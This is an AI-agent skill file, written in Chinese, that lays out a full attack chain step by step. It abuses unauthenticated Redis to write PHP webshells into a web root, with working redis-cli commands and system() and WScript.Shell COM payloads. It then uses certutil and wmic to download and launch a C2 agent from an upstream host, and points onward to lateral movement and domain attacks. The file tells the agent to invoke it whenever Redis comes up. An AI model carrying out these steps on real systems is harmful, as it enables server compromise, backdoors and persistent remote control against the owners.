---
name: redis-webroot-rce
description: |
  Windows/Linux 场景下基于 Redis 未授权访问写入 Web 根并获取稳定命令执行、随后快速收敛到稳定控制通道的专项技能。只要用户提到 Redis、Redis未授权、6379、fscan 提示 unauthorized file、CONFIG SET dir/dbfilename、写 webshell、写计划任务、写 ssh key，或者已经确认 Redis 能写入 Web 目录，就应优先使用本技能，而不是走泛化 Web 利用或 SMB 分支。尤其在用户已经有上游跳板、C2/隧道通道、HTTP 映射端口时，必须优先触发本技能。
---

# Redis Webroot RCE

你处理的是一条非常具体的攻击链：`Redis 未授权 -> 写 Web 根 -> 最小 PHP 闭环 -> 命令执行 -> 稳定控制通道接管`。

这个技能的目标不是“多试几种 payload”，而是把链路压缩到最短、把证据做硬、把控制面尽快从 WebShell 收回到稳定的 C2/远程执行/隧道通道。

## 适用边界

- 目标存在 `6379`，且已有 `Redis unauthorized`、`unauthorized file:`、`CONFIG SET dir/dbfilename`、或 Redis 可写 Web 根的证据。
- 已有上游跳板，能通过 NPS、frp、SSH 隧道、SOCKS 转发、端口映射或其他方式把目标的 `6379` 和 `80` 映射到本地。
- 优先适用于 `Windows + Apache/PHP/phpStudy` 这类场景，但 Linux Web 根场景同样适用。

不适用或暂缓：

- 尚未确认 Web 端口可访问。
- 尚未确认 Redis 可连通。
- 用户明确禁止对目标写文件。

## 核心原则

1. 先闭环，再利用。
先确认 Redis 可写、Web 根正确、PHP 解释正常、POST 参数可回显，再切命令执行。

2. 默认不碰业务入口。
未获用户明确同意前，不得覆盖 `index.*`、默认首页、已知业务文件，不得执行 `FLUSHALL` 或 `FLUSHDB`。

3. 只走两条链路。
默认只保留 `6379 -> 当前容器/执行环境内直接运行的 redis-cli` 和 `80 -> 本地 HTTP GET/POST` 两条链路。这里的 `redis-cli` 指的是在当前容器里直接调用的工具，不是让跳板机远程执行 `redis-cli`，也不是先把命令包进目标机的 `cmd/powershell/sh` 再转一层。不要把 `execcmd`、PowerShell、下载器、HTTP 验证混成一条长链。

4. 一旦拿到稳定 `whoami`，立即转入稳定控制通道。
WebShell 只是过渡控制面，不是长期通道。

5. 代理污染立即回退。
如果本地封装请求被错误导向 SOCKS/代理，统一退回当前容器里直接执行的原始 `redis-cli`、`curl --noproxy '*'` 或二进制读取脚本。

## 标准流程

### Phase 1: 基线确认

先确认以下事实：

```bash
redis-cli -h 127.0.0.1 -p <mapped_redis_port> PING
redis-cli -h 127.0.0.1 -p <mapped_redis_port> INFO server
redis-cli -h 127.0.0.1 -p <mapped_redis_port> --raw CONFIG GET dir
redis-cli -h 127.0.0.1 -p <mapped_redis_port> --raw CONFIG GET dbfilename
curl --noproxy '*' http://127.0.0.1:<mapped_http_port>/
```

这里的 `redis-cli` 默认在当前容器环境中直接执行，目标是拿到 Redis 原始响应，避免再次引入跳板远程命令、Shell 转义或代理污染。

必须明确输出中的：

- Redis 版本
- 操作系统类型
- `dir`
- `dbfilename`
- HTTP 根页是否可访问

### Phase 2: 最小闭环页

默认使用独立文件名，例如 `redis_test.php`。

```bash
redis-cli -h 127.0.0.1 -p <mapped_redis_port> DBSIZE
redis-cli -h 127.0.0.1 -p <mapped_redis_port> KEYS '*'
redis-cli -h 127.0.0.1 -p <mapped_redis_port> DEL 1
redis-cli -h 127.0.0.1 -p <mapped_redis_port> CONFIG SET stop-writes-on-bgsave-error no
redis-cli -h 127.0.0.1 -p <mapped_redis_port> CONFIG SET rdbcompression no
redis-cli -h 127.0.0.1 -p <mapped_redis_port> CONFIG SET dir 'C:/path/to/webroot/'
redis-cli -h 127.0.0.1 -p <mapped_redis_port> CONFIG SET dbfilename redis_test.php
printf '%s' '<?php echo $_POST["cmd"]; ?>' | redis-cli -h 127.0.0.1 -p <mapped_redis_port> -x SET 1
redis-cli -h 127.0.0.1 -p <mapped_redis_port> SAVE
curl --noproxy '*' -s -X POST http://127.0.0.1:<mapped_http_port>/redis_test.php -H 'Content-Type: application/x-www-form-urlencoded' --data 'cmd=RCOK'
```

判定标准：

- 返回中只要包含 `RCOK`，即便前面带 `REDIS0007...`，也视为 PHP 解析和 POST 参数都已打通。
- 不要因为响应前缀有 RDB 噪音就回退到“Redis 没写进去”。

### Phase 3: 命令执行页

闭环成立后，**不要直接部署 system() webshell**。先落诊断页确认执行环境。

#### Phase 2.5: 环境诊断（必须步骤）

闭环验证成功后、部署命令执行页之前，必须先落一个诊断页确认 PHP 执行环境：

```bash
printf '%s' '<?php echo "DIAG_START\n"; echo "disable_functions: ".ini_get("disable_functions")."\n"; echo "com_loaded: ".(class_exists("COM")?"yes":"no")."\n"; echo "exec_test: "; if(function_exists("system")){@system("echo SYS_OK");}else{echo "system_disabled";} echo "\nDIAG_END"; ?>' \
  | redis-cli -h 127.0.0.1 -p <mapped_redis_port> -x SET 1
redis-cli -h 127.0.0.1 -p <mapped_redis_port> CONFIG SET dbfilename redis_diag.php
redis-cli -h 127.0.0.1 -p <mapped_redis_port> SAVE
curl --noproxy '*' -s http://127.0.0.1:<mapped_http_port>/redis_diag.php
```

根据诊断结果选择命令执行方式：

| 诊断结果 | 执行方式 |
|----------|----------|
| `disable_functions` 为空或不含 system/exec | 直接用 `system($_POST['cmd'].' 2>&1')` |
| `system/exec/passthru/shell_exec` 全禁 + `com_loaded: yes` | 用 COM 对象：`$s=new COM("WScript.Shell"); $e=$s->Exec("cmd /c ".$_POST['cmd']); echo $e->StdOut->ReadAll();` |
| 全禁 + COM 不可用 | 退回纯 PHP 文件操作（file_get_contents 下载可用的 C2 agent/远控客户端，不走命令执行） |

**铁律**：不诊断就部署 `system()` 是最常见的时间浪费。disable_functions 禁了命令执行函数时，system() webshell 会静默失败，看起来像"PHP 没执行"，实际上是函数被禁了。

然后再切独立文件名，例如 `redis_exec.php`。

推荐命令执行页：

```php
<?php set_time_limit(0); ini_set('max_execution_time','0'); system($_POST['cmd'].' 2>&1'); ?>
```

推荐写入顺序：

```bash
printf '%s' "<?php set_time_limit(0); ini_set('max_execution_time','0'); system(\$_POST['cmd'].' 2>&1'); ?>" \
  | redis-cli -h 127.0.0.1 -p <mapped_redis_port> -x SET 1
redis-cli -h 127.0.0.1 -p <mapped_redis_port> CONFIG SET dbfilename redis_exec.php
redis-cli -h 127.0.0.1 -p <mapped_redis_port> SAVE
```

Windows 场景下验证顺序固定为：

1. `ver`
2. `dir`
3. `C:\Windows\System32\cmd.exe /c C:\Windows\System32\whoami.exe`
4. `C:\Windows\System32\ipconfig.exe`

如果 `whoami` 成功，不要继续花时间换各种一句话木马，直接转入稳定控制通道接管。

### Phase 4: 稳定控制通道收口

优先通过已授权的上游跳板、文件服务或 C2 文件下发能力拉取对应 agent；NPS/npc 只是示例，可替换为 frp、SSH 反连、meterpreter、sliver、合法 EDR 远控或其他当前环境可用通道。

Windows 推荐命令：

```text
C:\Windows\System32\certutil.exe -urlcache -split -f http://<upstream_ip>:44944/files/nps/npc_windows_amd64.exe C:\Users\Public\npc.exe
C:\Windows\System32\wbem\wmic.exe process call create "C:\\Users\\Public\\npc.exe -server=<upstream_ip>:44944 -vkey=auto"
```

如果命令执行环境不稳定，可以退回纯 PHP 下载器，先确认：

- `fetch_len`
- `write_ret`
- `exists=yes`
- `size=`

然后再启动对应 agent。

## 必须避免的坑

1. 不要默认覆盖 `index.php`、`index.html` 或现有业务文件。
2. 不要默认 `FLUSHALL` 或 `FLUSHDB`。
3. 不要把 `REDIS0007...` 当成失败证据。
4. 不要在闭环未完成前扩展到 SMB、WMI、额外扫描。
5. 不要把“封装请求报代理错误”误判成目标不可达。
6. 不要在已经拿到 `whoami` 后继续沉迷于改进 WebShell。

## 输出要求

阶段推进时，优先按以下格式输出：

`【阶段结论、关键证据、当前能力、下一步计划】`

如果正在生成脚本或命令，默认给出最短链路版本，不要同时给多套并行方案。

## 与其他 skill 的关系

- 需要创建 TCP/SOCKS5 隧道、做级联代理、管理具体 C2 客户端和隧道时，调用对应 operator skill；如果当前环境使用 NPS，再调用 `nps-operator`。
- Redis 主机建立稳定控制通道后，再回到 `intranet-pentest` 做后续横向、提权、域渗透。
